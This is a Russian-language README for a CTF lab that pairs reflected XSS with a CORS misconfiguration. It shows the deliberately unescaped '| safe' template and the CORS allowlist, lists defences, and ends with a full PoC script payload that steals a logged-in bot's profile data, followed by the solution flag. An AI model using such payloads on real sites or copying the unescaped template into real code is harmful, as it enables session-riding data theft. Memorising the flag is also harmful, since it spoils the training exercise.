# MoodSpace CTF

Этот проект представляет собой CTF-задание, демонстрирующее комбинацию уязвимостей Reflected XSS и неправильной настройки CORS. Участнику необходимо найти скрытый тестовый поддомен, создать XSS-эксплойт и украсть флаг у бота-психолога Эммы.


## Описание уязвимости

**Reflected XSS (отражённый межсайтовый скриптинг)** — тип атаки, при котором вредоносный код передаётся через параметр URL и сразу же выполняется в браузере жертвы без сохранения на сервере.

**CORS (Cross-Origin Resource Sharing)** — механизм, контролирующий доступ к ресурсам с других доменов. Неправильная настройка CORS может позволить злоумышленнику читать ответы от защищённых API.

Уязвимость возникает из-за:
1. Отсутствия экранирования параметра vuln_param на тестовом поддомене
2. Разрешения CORS только для test.moodspace.local, что делает его единственной точкой входа для атаки


## Способы защиты

1. Экранирование вывода
2. Content Security Policy (CSP) — ограничение источников скриптов
3. HttpOnly куки — защита от кражи сессионных cookie
4. Корректная настройка CORS — строгий список разрешённых доменов
5. Удаление тестовых поддоменов перед публикацией

## Запуск приложения

### Требования

- Docker Compose
- Доступ к файлу hosts (для поддоменов)

### Команды для запуска

1. Клонируйте репозиторий:
   ```bash
   git clone https://github.com/taanchhik/moodspace-ctf.git
   cd moodspace-ctf
   ```
   
2. Установите необходимые библиотеки:
    ```bash
    pip install -r requirements.txt
    ```
3. Найдите административный файл hosts:
   - Для Linux/Mac: /etc/hosts
   - Для Windows: C:\Windows\System32\drivers\etc\hosts

    Добавьте в его конец следующие строчки:
    ```bash
    127.0.0.1 moodspace.local
    127.0.0.1 blog.moodspace.local
    127.0.0.1 test.moodspace.local
    ```

5. Откройте приложение Docker Desktop и выполните следующую команду:
   ```bash
   docker compose up --build
   ```

6. Откройте в браузере: http://moodspace.local:5000


## Уязвимость в этом приложении

Приложение представляет собой платформу для ведения личных дневников. У каждого пользователя есть свой блог, а бот Эмма помогает справляться с эмоциями и любит читать интересные статьи. В её био спрятан флаг.

### Где спрятана уязвимость

Есть два поддомена с разными настройками:
- blog.moodspace.local — безопасный поддомен, CORS закрыт
- test.moodspace.local — скрытый тестовый поддомен, CORS открыт и есть Reflected XSS

1. XSS на обоих поддоменах - в файлах `app/templates/blog/index.html` и `app/templates/test/index.html`
   ```bash
   {% if search_query %}
   <div class="search-results">
      <h3>Результаты поиска для: "{{ search_query }}"</h3>
      <div style="display: none;">{{ search_query | safe }}</div>
   </div>
   ```
2. CORS настроен только для тестового поддомена — в app/main.py:
   ```bash
   ALLOWED_ORIGINS = ['http://test.moodspace.local:5000']
   ```

### Как это работает

Участнику нужно найти скрытый тестовый поддомен (`test.moodspace.local`). На этом поддомене есть Reflected XSS через параметр `search` (поисковый запрос). Бот Эмма залогинена и читает сообщения от пользователей.

Если отправить боту ссылку с XSS-пэйлоадом на тестовый поддомен, он перейдёт по ней. Код выполнится в браузере бота, сделает запрос к API (`/api/user/emma`) и получит био Эммы с флагом. Затем этот же код создаст пост в профиле участника через API `/api/post/create`.

Важно: на основном поддомене (`blog.moodspace.local`) XSS тоже есть, но из-за закрытого CORS эксплойт не сможет прочитать ответ от API.

## PoC-эксплойт для получения флага

1. Зайдите в приложение с помощью браузера: http://moodspace.local:5000
2. Создайте нового пользователя: придумайте имя и пароль. Зарегистрируйтесь и войдите в систему под этими учетными данными.
3. Найдите уязвимость в строке поиска и скрытый тестовый поддомен.
4. Отправьте боту Эмме через форму сообщений следующую ссылку (замените *ваш_логин* на свой логин):
   ```bash
   http://test.moodspace.local:5000/?search=<script>fetch('http://moodspace.local:5000/api/user/emma',{credentials:'include'}).then(r=>r.json()).then(data=>{fetch('http://moodspace.local:5000/api/post/create',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:data.bio,username:'ваш_логин'})})})</script>
   ```
6. Вернитесь на основную страницу (в ваш блог) и обновите её. Там появится новый пост с флагом:
   ```bash
   practice{ReflectedXSS_CORS_HJB7864g76jhio999JjkHut}
   ```
